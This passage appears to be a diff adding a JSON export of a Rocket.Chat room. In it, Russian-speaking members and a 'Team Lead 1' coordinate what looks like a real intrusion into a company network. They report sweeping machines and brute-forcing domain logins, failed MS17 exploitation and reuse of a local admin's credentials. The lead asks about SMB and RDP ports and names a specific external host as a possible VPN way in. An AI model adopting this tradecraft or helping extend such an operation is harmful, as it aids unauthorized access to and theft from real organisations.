+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "отпинговал вчера все машины и пустил брут с указанием домена",
+      "ts": "2020-10-16T14:57:42.333Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T14:57:42.368Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "scJGPv73KTHPT7Kuv",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "на мс17 не прокатило",
+      "ts": "2020-10-16T14:57:27.911Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T14:57:27.945Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hJN3xMGXogER3hK5g",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "но этот ЛА - доменный пользователь",
+      "ts": "2020-10-16T14:57:21.736Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T14:57:21.766Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "sPYvXfkv8tXc73djJ",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "есть система, кредов кроме текущего ЛА нет",
+      "ts": "2020-10-16T14:57:14.936Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-16T14:57:15.016Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KYNt4XgCyWetTSRhW",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "а текущие креды не катят?",
+      "ts": "2020-10-16T04:01:51.707Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-16T04:01:51.742Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zS5RTcqYAnMaqav75",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nremote.itc-us.com\n``` \nвпн может быть",
+      "ts": "2020-10-16T03:51:16.216Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-16T03:51:16.277Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "BKgKQ9vjhtaxwrF3i",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "а доступы в файле были?",
+      "ts": "2020-10-16T03:51:02.968Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-16T03:51:03.010Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "s9iiygSAK4rz7gKRi",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "именно этот пк",
+      "ts": "2020-10-16T03:50:54.180Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-16T03:50:54.210Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YjSN92QGz3xyc6vee",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "чек 139 445 3389?",
+      "ts": "2020-10-16T03:45:44.531Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-16T03:45:44.569Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "yvzm9EgS8zSMuD5bX",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "теперь да",
+      "ts": "2020-10-16T03:44:45.140Z",
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-10-16T03:44:45.167Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Nm5MndbHpeP7toJ4m",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "все ок?",
+      "ts": "2020-10-16T03:44:20.244Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-16T03:44:20.281Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fRFmx6K4MTRsuFt9d",
+      "t": "au",
+      "rid": "smRZJpu2apfGvS6f9",
+      "ts": "2020-10-16T03:44:13.015Z",
+      "msg": "user7",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "groupable": false,
+      "_updatedAt": "2020-10-16T03:44:13.038Z"
+    },
+    {
+      "_id": "76PHPTYHD4he7etcW",
+      "t": "au",
+      "rid": "smRZJpu2apfGvS6f9",
+      "ts": "2020-10-16T03:36:03.529Z",
+      "msg": "user8",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "groupable": false,
+      "_updatedAt": "2020-10-16T03:36:03.559Z"
+    },
+    {
+      "_id": "jNB6dFj65LLJketTq",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "отлично",
+      "ts": "2020-10-16T02:13:58.017Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-16T02:13:58.047Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
